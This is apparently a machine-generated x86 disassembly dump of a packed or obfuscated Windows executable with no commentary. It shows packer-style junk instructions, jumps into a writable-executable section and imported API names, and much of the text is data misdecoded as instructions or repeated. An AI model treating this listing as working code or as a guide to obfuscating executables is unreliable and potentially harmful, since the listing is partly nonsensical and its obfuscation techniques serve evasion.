push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
mov [ esp + 0x4 ] ch
pushad
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
int3
outsb
inc esp
jae rwxdata
jmp rwxdata
pushad
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
0xda80
je rwxdata
pushfd
jmp rwxdata
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
je rwxdata
jns rwxdata
jne rwxdata
or [ ecx + 0x3a ] esp
jo rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
mov al [ 0xffffffffae5c8487 ]
dec ebp
jmp rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
call sub_514aff
jmp rwxdata
lea esp [ esp + 0x8 ]

test al 0xf7
scasb [ edi ]
retn 0xc088
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
sub_4ba811
inc ecx
rcl bl 0x4
and bl ch
xchg ebp eax
call sub_5164ce
add [ eax ] al
dec ecx
insd
jo rwxdata
outsd
ja rwxdata
jb rwxdata
sbb [ ecx ] esp
je rwxdata
insd
outsd
outsb
popad
je rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
arpl [ edx + 0x79 ] si
je rwxdata
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
add [ eax + 0xc ] ch
insd
imul ebp [ edi + 0x6e ] 0x41
insd
insd
dec esp
outsd
dec edi
outsb
push ebp
jae rwxdata
jmp rwxdata
outsb
jo rwxdata
inc esp
arpl [ gs : edx + 0x79 ] si
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
outsd
outsb
inc ecx
add [ eax ] al
add [ ebp + 0x65 ] ch
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
popad
jo rwxdata
add [ edi + edi * 8 + 0x648d2434 ] bl
and al 0xc
outsd
jbe rwxdata
jb __export_name_ptr_table_0(KERNEL32:GetStartupInfoA)
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
int3
jbe rwxdata
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
jpe rwxdata
push 0x332482c5
add [ eax ] al
inc edi
je rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
jae rwxdata
arpl [ ebp + 0x43 ] sp
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
push 0x246c8800
add al 0x60
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
je rwxdata
pushad
jmp rwxdata
outsd
in al 0xcf
je rwxdata
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
outsb
inc esp
jae rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
adc eax eax
scasb [ edi ]
call sub_5183e2
fsubr st0
or eax [ eax ]
add [ esi + 0x63 ] ah
insb
outsd
jae rwxdata
jb rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
0xda80
je rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
jne rwxdata
push [ esp ]
lea esp [ esp + 0xc ]
jne rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
or [ ecx + 0x3a ] esp
jo rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
dec ecx
outsb
outsw
inc ecx
add [ eax ] al
add [ edi + ebp * 2 + 0x6f ] cl
imul esi [ ebp + 0x70 ] 0x50
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
test [ ecx + 0x69 ] esp
add [ eax ] eax
jbe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
pushad
imul eax [ ecx ] 0x82c56800
and al 0x33
insb
push esi
popad
insb
jne rwxdata
je rwxdata
jns rwxdata
jne rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
push [ esp + 0x1c ]
stosb [ edi ]
mov [ esp + 0x4 ] 0x54
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
and [ ebx + esi ] 0x60
inc ecx
add ch dh
rcl di cl
mov [ ebp - 0x4 ] edx
bsf dx si
mov edx [ ebp - 0x4 ]
bts edi 0x6
mov edi [ edx + 0x10 ]
cmp ax 0x9597
call sub_517dae
add [ eax ] al
dec edi
jo rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
call sub_4ba009
add [ eax ] al
inc ebx
push 0x21193420
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jb rwxdata
outsb
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
je rwxdata
jae rwxdata
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
je rwxdata
popad
jo rwxdata
je rwxdata
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
